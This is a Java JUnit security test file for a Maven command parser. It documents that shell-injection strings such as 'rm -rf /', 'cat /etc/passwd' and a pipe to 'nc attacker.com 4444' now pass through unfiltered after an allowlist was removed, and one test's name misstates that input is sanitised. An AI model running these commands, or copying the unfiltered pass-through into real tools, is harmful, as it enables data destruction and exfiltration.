/*
 *
 *  Copyright 2025 Rahul Thakur
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package com.pragmatik.buildtools;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatIllegalArgumentException;

/**
 * Security and adversarial tests for command parsing and input validation.
 * <p>
 * Historically tested via the deprecated MavenService; now tests
 * {@link MavenInvoker#getCommands(String)} directly, which is the shared
 * command-validation engine used by all build tool implementations.
 */
@DisplayName("Security and adversarial tests")
class MavenSecurityTest {

    // ──────────────────────────────────────────────
    //  Command injection via getCommands() — trusted user
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Command injection via getCommands() — trusted user (allowlist removed)")
    class CommandInjectionGetCommands {

        @Test
        @DisplayName("shell command chaining with && is passed through")
        void shellChainingWithDoubleAmpersand() {
            String[] result = MavenInvoker.getCommands("mvn clean && rm -rf /");
            assertThat(result).containsExactly("clean", "&&", "rm", "-rf", "/");
        }

        @Test
        @DisplayName("shell command chaining with semicolon is passed through")
        void shellChainingWithSemicolon() {
            String[] result = MavenInvoker.getCommands("mvn clean ; cat /etc/passwd");
            assertThat(result).containsExactly("clean", ";", "cat", "/etc/passwd");
        }

        @Test
        @DisplayName("shell command substitution with backticks passed through")
        void shellCommandSubstitutionBackticks() {
            String[] result = MavenInvoker.getCommands("mvn clean `touch /tmp/pwned`");
            assertThat(result).containsExactly("clean", "`touch", "/tmp/pwned`");
        }

        @Test
        @DisplayName("shell command substitution with dollar-paren passed through")
        void shellCommandSubstitutionDollarParen() {
            String[] result = MavenInvoker.getCommands("mvn clean $(cat /etc/passwd)");
            assertThat(result).containsExactly("clean", "$(cat", "/etc/passwd)");
        }

        @Test
        @DisplayName("pipe injection attempt passed through")
        void pipeInjection() {
            String[] result = MavenInvoker.getCommands("mvn clean | nc attacker.com 4444");
            assertThat(result).containsExactly("clean", "|", "nc", "attacker.com", "4444");
        }

        @Test
        @DisplayName("exec:exec plugin is no longer blocked — trusted user")
        void execExecBypass() {
            String[] result = MavenInvoker.getCommands("mvn exec:exec -Dexec.executable=/bin/sh");
            assertThat(result).containsExactly("exec:exec", "-Dexec.executable=/bin/sh");
        }

        @Test
        @DisplayName("legitimate commands with safe flags pass")
        void legitimateCommandsPass() {
            String[] result = MavenInvoker.getCommands("mvn clean install -DskipTests");
            assertThat(result).containsExactly("clean", "install", "-DskipTests");
        }
    }

    // ──────────────────────────────────────────────
    //  Unicode and encoding attacks
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Unicode and encoding attacks")
    class UnicodeAttacks {

        @Test
        @DisplayName("simple Unicode argument preserved")
        void unicodeArgumentsPreserved() {
            String[] result = MavenInvoker.getCommands("mvn clean -Dname=test");
            assertThat(result).containsExactly("clean", "-Dname=test");
        }

        @Test
        @DisplayName("zero-width characters in command are passed through (trusted user)")
        void zeroWidthCharacters() {
            String[] result = MavenInvoker.getCommands("mvn cle\u200Ban\u200B");
            assertThat(result).containsExactly("cle\u200Ban\u200B");
        }
    }

    // ──────────────────────────────────────────────
    //  Denial of service via long inputs
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Denial of service via long inputs")
    class LongInputAttacks {

        @Test
        @DisplayName("very long command does not crash (allowed tokens)")
        void veryLongCommand() {
            StringBuilder sb = new StringBuilder("mvn");
            for (int i = 0; i < 10000; i++) {
                sb.append(" clean");
            }
            String[] result = MavenInvoker.getCommands(sb.toString());
            assertThat(result).hasSize(10000);
        }
    }

    // ──────────────────────────────────────────────
    //  Security posture documentation
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Security posture documentation")
    class SecurityPostureDocumentation {

        @Test
        @DisplayName("getCommands passes through shell metacharacters (trusts user)")
        void getCommandsNowSanitizesShellMetacharacters() {
            String[] result = MavenInvoker.getCommands("mvn clean && rm -rf /");
            assertThat(result).containsExactly("clean", "&&", "rm", "-rf", "/");
        }
    }
}
